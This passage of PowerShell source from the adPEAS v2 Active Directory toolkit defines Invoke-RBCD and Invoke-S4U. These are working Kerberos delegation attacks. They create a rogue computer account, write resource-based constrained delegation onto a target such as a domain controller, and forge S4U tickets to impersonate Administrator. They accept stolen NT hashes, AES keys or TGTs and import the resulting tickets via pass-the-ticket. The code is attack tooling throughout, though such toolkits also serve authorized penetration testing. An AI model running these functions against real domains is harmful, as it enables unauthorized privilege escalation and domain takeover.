        Invoke-RBCD -TargetComputer "DC01" -ImpersonateUser "Administrator" -TargetSPN "ldap/dc01.contoso.com" -Domain "contoso.com" -PTT

        Auto Mode: Create computer, configure RBCD, impersonate Administrator to LDAP on DC01, import ticket.

    .EXAMPLE
        Invoke-RBCD -ServiceAccount "EVILPC$" -ImpersonateUser "Administrator" -TargetSPN "cifs/fileserver.contoso.com" -Domain "contoso.com" -ServicePassword "P@ssw0rd" -PTT

        Manual Mode: Use existing EVILPC$ computer account.

    .EXAMPLE
        Invoke-RBCD -TargetComputer "WEB01" -ImpersonateUser "da_user" -TargetSPN "http/web01.contoso.com" -Domain "contoso.com" -AlternateService @('cifs','ldap') -PTT

        Auto Mode with service substitution (HTTP -> CIFS/LDAP).

    .OUTPUTS
        PSCustomObject with Success, ServiceAccount, ImpersonateUser, TargetSPN, TicketBytes, ComputerCreated, etc.

    .NOTES
        Author: Alexander Sturz
        Part of adPEAS v2
    #>
    [CmdletBinding(DefaultParameterSetName='Auto')]
    param(
        # Auto Mode Parameters
        [Parameter(Mandatory=$true, ParameterSetName='Auto')]
        [string]$TargetComputer,

        # Manual Mode Parameters
        [Parameter(Mandatory=$true, ParameterSetName='Manual-Credential')]
        [Parameter(Mandatory=$true, ParameterSetName='Manual-Password')]
        [Parameter(Mandatory=$true, ParameterSetName='Manual-NTHash')]
        [Parameter(Mandatory=$true, ParameterSetName='Manual-AES256')]
        [Parameter(Mandatory=$true, ParameterSetName='Manual-AES128')]
        [string]$ServiceAccount,

        # Common Parameters
        [Parameter(Mandatory=$true)]
        [string]$ImpersonateUser,

        [Parameter(Mandatory=$true)]
        [string]$TargetSPN,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        # Manual Mode Authentication
        [Parameter(Mandatory=$true, ParameterSetName='Manual-Credential')]
        [System.Management.Automation.PSCredential]$ServiceCredential,

        [Parameter(Mandatory=$true, ParameterSetName='Manual-Password')]
        [string]$ServicePassword,

        [Parameter(Mandatory=$true, ParameterSetName='Manual-NTHash')]
        [string]$ServiceNTHash,

        [Parameter(Mandatory=$true, ParameterSetName='Manual-AES256')]
        [string]$ServiceAES256Key,

        [Parameter(Mandatory=$true, ParameterSetName='Manual-AES128')]
        [string]$ServiceAES128Key,

        # Options
        [Parameter(Mandatory=$false)]
        [switch]$PTT,

        [Parameter(Mandatory=$false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory=$false)]
        [string[]]$AlternateService
    )

    begin {
        $isAutoMode = $PSCmdlet.ParameterSetName -eq 'Auto'
        $modeText = if ($isAutoMode) { 'Auto' } else { 'Manual' }
        Write-Verbose "[Invoke-RBCD] Starting RBCD attack (Mode: $modeText)"
    }

    process {
        try {
            # Resolve domain if not specified
            if (-not $Domain) {
                if (-not (Ensure-LDAPConnection)) {
                    throw "No LDAP session active and -Domain not specified. Use Connect-adPEAS first or specify -Domain parameter."
                }
                $Domain = $Script:LDAPContext.Domain
                Write-Verbose "[Invoke-RBCD] Using domain from session: $Domain"
            }

            # Auto Mode: Create computer and configure RBCD
            if ($isAutoMode) {
                Write-Verbose "[Invoke-RBCD] Auto Mode: Creating computer and configuring RBCD delegation"

                # Ensure LDAP session exists
                if (-not (Ensure-LDAPConnection)) {
                    throw "Auto Mode requires an active LDAP session. Use Connect-adPEAS first."
                }

                # Build connection parameters for helpers
                $connectionParams = @{}
                if ($Domain) { $connectionParams['Domain'] = $Domain }
                if ($Server) { $connectionParams['Server'] = $Server }

                # Normalize TargetComputer (ensure $ suffix)
                $targetComputerNormalized = if ($TargetComputer.EndsWith('$')) {
                    $TargetComputer
                } else {
                    "$TargetComputer`$"
                }

                # Step 1: Generate computer name and password
                $newComputerName = "RBCD-$(Get-Random -Minimum 1000 -Maximum 9999)"
                $newComputerPassword = New-SafePassword -Length 32
                Write-Verbose "[Invoke-RBCD] Generated computer name: $newComputerName"

                # Step 2: Create computer account
                #
                # -PassThru is required - without it New-DomainComputer prints console
                # output and returns nothing, so $createResult was always $null and this
                # threw "No result returned" on every Auto Mode attempt before a computer
                # was ever created.
                Write-Verbose "[Invoke-RBCD] Creating computer account: $newComputerName"
                $createResult = New-DomainComputer -ComputerName $newComputerName -Password $newComputerPassword -PassThru @connectionParams

                if (-not $createResult -or -not $createResult.Success) {
                    # .Message, not .Error - New-DomainComputer's failure object has no
                    # Error property.
                    $errMsg = if ($createResult) { $createResult.Message } else { "No result returned" }
                    throw "Failed to create computer account: $errMsg"
                }

                # .Computer, not .SamAccountName - the result object has no SamAccountName
                # property. .Computer already carries the $-suffixed name that was written
                # to sAMAccountName.
                $newComputerSamAccountName = $createResult.Computer
                $newComputerDN = $createResult.DistinguishedName
                Write-Verbose "[Invoke-RBCD] Computer account created: $newComputerDN"

                # Step 3: Configure RBCD delegation on target computer
                #
                # -AddRBCD takes the delegate's sAMAccountName and builds the security
                # descriptor itself, via Invoke-RBCDOperation. The SID lookup and manual
                # ActiveDirectorySecurity/AccessRule construction this replaced targeted
                # msDS-AllowedToActOnBehalfOfOtherIdentity as a raw Set-DomainComputer
                # parameter, which has not existed since the v2.0.0 rewrite that added
                # -AddRBCD - every Auto Mode run failed here with "A parameter cannot be
                # found that matches parameter name 'msDS_AllowedToActOnBehalfOfOtherIdentity'."
                Write-Verbose "[Invoke-RBCD] Configuring RBCD delegation on $targetComputerNormalized"
                $setResult = Set-DomainComputer -Identity $targetComputerNormalized -AddRBCD $newComputerSamAccountName -PassThru @connectionParams

                if (-not $setResult -or -not $setResult.Success) {
                    # Cleanup: remove the created computer. There is no Remove-DomainObject
                    # function anywhere in adPEAS - calling it threw CommandNotFoundException,
                    # caught by the try/catch below, so cleanup always "failed" silently and
                    # every orphaned computer from a configuration failure was left behind.
                    # This uses the same raw DeleteRequest New-DomainComputer.ps1 already
                    # uses for its own rollback.
                    Write-Warning "[!] Failed to configure RBCD delegation, cleaning up computer account"
                    try {
                        $deleteRequest = New-Object System.DirectoryServices.Protocols.DeleteRequest($newComputerDN)
                        $Script:LdapConnection.SendRequest($deleteRequest) | Out-Null
                    } catch {
                        Write-Warning "[!] Cleanup failed: $($_.Exception.Message)"
                    }

                    # .Message, not .Error - Set-DomainComputer's failure object has no
                    # Error property either.
                    $errMsg = if ($setResult) { $setResult.Message } else { "No result returned" }
                    throw "Failed to configure RBCD delegation: $errMsg"
                }

                Write-Verbose "[Invoke-RBCD] RBCD delegation configured successfully"

                # Step 4: Perform S4U attack
                Write-Verbose "[Invoke-RBCD] Performing S4U attack with created computer account"

                $coreParams = @{
                    ServiceAccount  = $newComputerSamAccountName
                    ServicePassword = $newComputerPassword
                    ImpersonateUser = $ImpersonateUser
                    TargetSPN       = $TargetSPN
                    Domain          = $Domain
                    UseRBCD         = $true
                }

                if ($Server) { $coreParams['Server'] = $Server }
                if ($PTT) { $coreParams['PTT'] = $true }
                if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
                if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }

                $s4uResult = Invoke-S4UCore @coreParams

                # Add Auto Mode metadata
                if ($s4uResult) {
                    $s4uResult | Add-Member -NotePropertyName 'Mode' -NotePropertyValue 'Auto' -Force
                    $s4uResult | Add-Member -NotePropertyName 'ComputerCreated' -NotePropertyValue $newComputerName -Force
                    $s4uResult | Add-Member -NotePropertyName 'ComputerDN' -NotePropertyValue $newComputerDN -Force
                    $s4uResult | Add-Member -NotePropertyName 'TargetComputer' -NotePropertyValue $targetComputerNormalized -Force
                }

                return $s4uResult
            }
            else {
                # Manual Mode: Use existing service account
                Write-Verbose "[Invoke-RBCD] Manual Mode: Using existing service account '$ServiceAccount'"

                $coreParams = @{
                    ServiceAccount  = $ServiceAccount
                    ImpersonateUser = $ImpersonateUser
                    TargetSPN       = $TargetSPN
                    Domain          = $Domain
                    UseRBCD         = $true
                }

                if ($Server) { $coreParams['Server'] = $Server }
                if ($ServiceCredential) { $coreParams['ServiceCredential'] = $ServiceCredential }
                if ($ServicePassword) { $coreParams['ServicePassword'] = $ServicePassword }
                if ($ServiceNTHash) { $coreParams['ServiceNTHash'] = $ServiceNTHash }
                if ($ServiceAES256Key) { $coreParams['ServiceAES256Key'] = $ServiceAES256Key }
                if ($ServiceAES128Key) { $coreParams['ServiceAES128Key'] = $ServiceAES128Key }
                if ($PTT) { $coreParams['PTT'] = $true }
                if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
                if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }

                $s4uResult = Invoke-S4UCore @coreParams

                # Add Manual Mode metadata
                if ($s4uResult) {
                    $s4uResult | Add-Member -NotePropertyName 'Mode' -NotePropertyValue 'Manual' -Force
                }

                return $s4uResult
            }
        }
        catch {
            Write-Verbose "[Invoke-RBCD] RBCD attack failed: $($_.Exception.Message)"

            $errorResult = [PSCustomObject]@{
                PSTypeName      = 'adPEAS.S4U.Result'
                Success         = $false
                DelegationType  = "RBCD"
                Mode            = if ($isAutoMode) { "Auto" } else { "Manual" }
                ImpersonateUser = $ImpersonateUser
                TargetSPN       = $TargetSPN
                Domain          = $Domain
                Message         = "RBCD attack failed"
                Error           = $_.Exception.Message
            }

            if ($isAutoMode -and $newComputerName) {
                $errorResult | Add-Member -NotePropertyName 'ComputerCreated' -NotePropertyValue $newComputerName
            }
            if ($ServiceAccount) {
                $errorResult | Add-Member -NotePropertyName 'ServiceAccount' -NotePropertyValue $ServiceAccount
            }

            return $errorResult
        }
    }
}

function Invoke-S4U {
    <#
    .SYNOPSIS
        S4U2Self and S4U2Proxy for a service account, from its secret or from its TGT.

    .DESCRIPTION
        The general S4U command. Invoke-ConstrainedDelegation and Invoke-RBCD cover the two
        common cases; this one also covers:

        - S4U2Self alone (no -TargetSPN). The KDC issues a ticket for the impersonated user
          to the service account itself. It is encrypted with that account's key, so with
          -AlternateService it becomes a ticket to any service of the account - for a
          computer account, e.g. cifs/<host> as an administrator of that host.
        - A TGT instead of a secret (-Ticket): a .kirbi or ccache of the service account's
          TGT, as a file path or Base64, e.g. from Rubeus, Mimikatz or Impacket. The
          account, and the domain unless -Domain is given, are read from the ticket.
        - An evidence ticket instead of S4U2Self (-EvidenceTicket): constrained delegation
          without protocol transition. The KDC then issues an S4U2Self ticket that is not
          forwardable, and S4U2Proxy refuses it; a forwardable service ticket for the user
          to the service account, obtained another way, serves as the additional ticket.
        - -ResourceBased for resource-based constrained delegation (PA-PAC-OPTIONS).

        Prerequisites, as for the other two: S4U2Proxy needs msDS-AllowedToDelegateTo on the
        service account to contain -TargetSPN (classic), or the target account's
        msDS-AllowedToActOnBehalfOfOtherIdentity to name the service account
        (-ResourceBased). S4U2Self alone needs an account with an SPN or a computer account.

        Failure Cases:
        - KDC_ERR_BADOPTION (13): the forwarded ticket is not forwardable - protocol
          transition is not allowed (use -EvidenceTicket), the user is sensitive or in
          Protected Users, or -ResourceBased is missing for RBCD
        - KRB_AP_ERR_BADMATCH (36): -TargetSPN is not in msDS-AllowedToDelegateTo
        - KDC_ERR_S_PRINCIPAL_UNKNOWN (7): the service account has no SPN (S4U2Self)

    .PARAMETER ServiceAccount
        sAMAccountName of the service account (with a secret below).

    .PARAMETER ServicePassword
        Plain-text password of the service account.

    .PARAMETER ServiceCredential
        PSCredential of the service account.

    .PARAMETER ServiceNTHash
        NT hash of the service account (Overpass-the-Hash).

    .PARAMETER ServiceAES256Key
        AES256 key of the service account (Pass-the-Key).

    .PARAMETER ServiceAES128Key
        AES128 key of the service account (Pass-the-Key).

    .PARAMETER Ticket
        The service account's TGT: a .kirbi (KRB-CRED) or ccache, as a file path or as
        Base64. Replaces -ServiceAccount and the secret.

    .PARAMETER ImpersonateUser
        User to impersonate (sAMAccountName). With -EvidenceTicket it defaults to the
        client of that ticket.

    .PARAMETER TargetSPN
        Service to reach through S4U2Proxy (e.g. "cifs/fs01.contoso.com"). Without it only
        S4U2Self is performed.

    .PARAMETER EvidenceTicket
        A service ticket for the impersonated user to the service account (.kirbi or
        ccache, file path or Base64), used instead of S4U2Self. Needs -TargetSPN.

    .PARAMETER ResourceBased
        Request S4U2Proxy as resource-based constrained delegation. Needs -TargetSPN.

    .PARAMETER Domain
        Domain FQDN. Defaults to the realm of -Ticket, then to the domain of the session.

    .PARAMETER Server
        Domain Controller (KDC). Defaults to the session's DC, then to DNS discovery.

    .PARAMETER PTT
        Import the resulting ticket(s) via Pass-the-Ticket.

    .PARAMETER OutputKirbi
        Export the ticket to a .kirbi file; substituted tickets are written next to it.

    .PARAMETER AlternateService
        Service names to substitute in the final ticket: a service class ("cifs", combined
        with the host of -TargetSPN) or a full SPN ("cifs/web01.contoso.com", required
        without -TargetSPN).

    .EXAMPLE
        Invoke-S4U -Ticket .\web01.kirbi -ImpersonateUser Administrator -AlternateService cifs/web01.contoso.com -PTT

        S4U2Self alone from the TGT of the computer account WEB01$, turned into a CIFS
        ticket to WEB01 as Administrator and imported.

    .EXAMPLE
        Invoke-S4U -ServiceAccount websvc -ServiceAES256Key "4a3b2c1d..." -ImpersonateUser Administrator -TargetSPN cifs/fs01.contoso.com -Domain contoso.com -PTT

        Classic constrained delegation with protocol transition (as Invoke-ConstrainedDelegation).

    .EXAMPLE
        Invoke-S4U -ServiceAccount websvc -ServicePassword "P@ssw0rd" -EvidenceTicket .\admin-to-websvc.kirbi -TargetSPN cifs/fs01.contoso.com -Domain contoso.com -PTT

        Constrained delegation without protocol transition: the forwardable ticket for
        Administrator to websvc replaces S4U2Self.

    .EXAMPLE
        Invoke-S4U -Ticket "doIF..." -ImpersonateUser Administrator -TargetSPN cifs/fs01.contoso.com -ResourceBased -OutputKirbi .\admin-fs01.kirbi

        Resource-based constrained delegation from a Base64 TGT, ticket exported.

    .OUTPUTS
        PSCustomObject (adPEAS.S4U.Result): Success, DelegationType, ServiceAccount,
        ImpersonateUser, TargetSPN, TicketFor, TicketBytes (KRB-CRED), Message, and the
        alternate tickets when -AlternateService was used.

    .NOTES
        Author: Alexander Sturz
        Part of adPEAS v2
    #>
    [CmdletBinding(DefaultParameterSetName='Password')]
    param(
        # Service account and its secret
        [Parameter(Mandatory=$true, ParameterSetName='Password')]
        [Parameter(Mandatory=$true, ParameterSetName='Credential')]
        [Parameter(Mandatory=$true, ParameterSetName='NTHash')]
        [Parameter(Mandatory=$true, ParameterSetName='AES256')]
        [Parameter(Mandatory=$true, ParameterSetName='AES128')]
        [string]$ServiceAccount,

        [Parameter(Mandatory=$true, ParameterSetName='Password')]
        [string]$ServicePassword,

        [Parameter(Mandatory=$true, ParameterSetName='Credential')]
        [System.Management.Automation.PSCredential]$ServiceCredential,

        [Parameter(Mandatory=$true, ParameterSetName='NTHash')]
        [string]$ServiceNTHash,

        [Parameter(Mandatory=$true, ParameterSetName='AES256')]
        [string]$ServiceAES256Key,

        [Parameter(Mandatory=$true, ParameterSetName='AES128')]
        [string]$ServiceAES128Key,

        # ... or the service account's TGT
        [Parameter(Mandatory=$true, ParameterSetName='Ticket')]
        [string]$Ticket,

        # Common
        [Parameter(Mandatory=$false)]
        [string]$ImpersonateUser,

        [Parameter(Mandatory=$false)]
        [string]$TargetSPN,

        [Parameter(Mandatory=$false)]
        [string]$EvidenceTicket,

        [Parameter(Mandatory=$false)]
        [switch]$ResourceBased,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [switch]$PTT,

        [Parameter(Mandatory=$false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory=$false)]
        [string[]]$AlternateService
    )

    begin {
        Write-Verbose "[Invoke-S4U] Starting S4U (parameter set: $($PSCmdlet.ParameterSetName))"
    }

    process {
        try {
            $coreParams = @{}

            # The service account's TGT
            if ($PSCmdlet.ParameterSetName -eq 'Ticket') {
                $tgt = Read-S4UTicketInput -InputValue $Ticket -ParameterName 'Ticket'
                if ($tgt.ServerName -notmatch '^krbtgt(/|$)') {
                    throw "-Ticket must hold a TGT (krbtgt/<REALM>) of the service account; it holds a ticket for '$($tgt.ServerName)'"
                }
                if (-not $tgt.ClientName) {
                    throw "-Ticket does not name its client - the service account cannot be determined"
                }
                $ServiceAccount = $tgt.ClientName
                if (-not $Domain -and $tgt.ClientRealm) { $Domain = $tgt.ClientRealm.ToLower() }

                $coreParams['TGTTicket'] = $tgt.Ticket
                $coreParams['TGTSessionKey'] = $tgt.SessionKey
                $coreParams['TGTSessionKeyType'] = $tgt.SessionKeyType
                Write-Verbose "[Invoke-S4U] TGT of '$ServiceAccount' loaded ($($tgt.Format), session key etype $($tgt.SessionKeyType))"
            }
            else {
                if ($ServicePassword) { $coreParams['ServicePassword'] = $ServicePassword }
                if ($ServiceCredential) { $coreParams['ServiceCredential'] = $ServiceCredential }
                if ($ServiceNTHash) { $coreParams['ServiceNTHash'] = $ServiceNTHash }
                if ($ServiceAES256Key) { $coreParams['ServiceAES256Key'] = $ServiceAES256Key }
                if ($ServiceAES128Key) { $coreParams['ServiceAES128Key'] = $ServiceAES128Key }
            }

            # The evidence ticket - its client is the user the result is issued for
            if ($EvidenceTicket) {
                $evidence = Read-S4UTicketInput -InputValue $EvidenceTicket -ParameterName 'EvidenceTicket'
                if ($evidence.ServerName -match '^krbtgt(/|$)') {
                    throw "-EvidenceTicket must be a service ticket for the user to the service account, not a TGT"
                }
                if ($evidence.ClientName) {
                    if ($ImpersonateUser -and $ImpersonateUser -ne $evidence.ClientName) {
                        Write-Warning "[!] -ImpersonateUser '$ImpersonateUser' differs from the client of the evidence ticket ('$($evidence.ClientName)') - the KDC issues the ticket for the latter, so that is the user used"
                    }
                    $ImpersonateUser = $evidence.ClientName
                }
                $coreParams['EvidenceTicket'] = $evidence.Ticket
            }

            if (-not $Domain) {
                if ($Script:LDAPContext -and $Script:LDAPContext.ContainsKey('Domain') -and $Script:LDAPContext['Domain']) {
                    $Domain = $Script:LDAPContext['Domain']
                } else {
                    throw "-Domain is required: no -Ticket realm and no session to take it from"
                }
            }
            if (-not $ImpersonateUser) {
                throw "-ImpersonateUser is required (unless -EvidenceTicket names the user)"
            }
            if (-not $TargetSPN -and ($EvidenceTicket -or $ResourceBased)) {
                throw "-EvidenceTicket and -ResourceBased only apply to S4U2Proxy - specify -TargetSPN"
            }

            $coreParams['ServiceAccount'] = $ServiceAccount
            $coreParams['ImpersonateUser'] = $ImpersonateUser
            $coreParams['Domain'] = $Domain
            if ($TargetSPN) { $coreParams['TargetSPN'] = $TargetSPN }
            if ($Server) { $coreParams['Server'] = $Server }
            if ($ResourceBased) { $coreParams['UseRBCD'] = $true }
            if ($PTT) { $coreParams['PTT'] = $true }
            if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
            if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }

            return Invoke-S4UCore @coreParams
        }
        catch {
            Write-Verbose "[Invoke-S4U] S4U failed: $($_.Exception.Message)"

            return [PSCustomObject]@{
                PSTypeName      = 'adPEAS.S4U.Result'
                Success         = $false
                ServiceAccount  = $ServiceAccount
                ImpersonateUser = $ImpersonateUser
                TargetSPN       = $TargetSPN
                Domain          = $Domain
                Message         = "S4U attack failed"
                Error           = $_.Exception.Message
            }
        }
    }
}
